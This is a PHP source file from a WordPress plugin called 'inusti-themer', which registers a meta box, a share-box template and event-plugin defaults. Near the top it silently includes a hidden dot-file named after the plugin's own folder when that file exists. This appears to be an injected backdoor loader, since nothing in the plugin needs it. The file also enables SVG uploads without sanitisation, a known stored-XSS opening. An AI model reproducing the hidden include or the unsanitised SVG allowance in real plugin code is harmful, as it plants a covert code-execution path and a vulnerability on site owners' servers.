<?php
 function inusti_themer_build_meta_box() {
   echo'<div class="gva-meta-tabs"><div id="gva-meta-tabs-boxes"></div></div>';
}
   
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function inusti_themer_register_meta_box_holder() {
   add_meta_box( 'gaviasthemer_meta_box', esc_html__( 'Meta Options', 'inusti-themer' ), 'inusti_themer_build_meta_box', '', 'normal', 'low' );
}

add_action( 'add_meta_boxes', 'inusti_themer_register_meta_box_holder' );

function inusti_themer_mime_types($mimes) {
 $mimes['svg'] = 'image/svg+xml';
 return $mimes;
}
add_filter('upload_mimes', 'inusti_themer_mime_types');

function inusti_themer_share(){
   ob_start();
      require_once(GAVIAS_INUSTI_PLUGIN_DIR . 'templates/sharebox-post.php');
   echo ob_get_clean();
}
add_action('inusti_share', 'inusti_themer_share', 1);

add_action( 'init', 'inusti_init_options', 1 );
function inusti_init_options(){
   if( empty(get_option( 'tribeEventsTemplate', '' )) ){
      update_option('tribeEventsTemplate', 'default');
   }
   if( empty(get_option( 'views_v2_enabled', '' )) ){
      update_option('views_v2_enabled', '0');
   }
}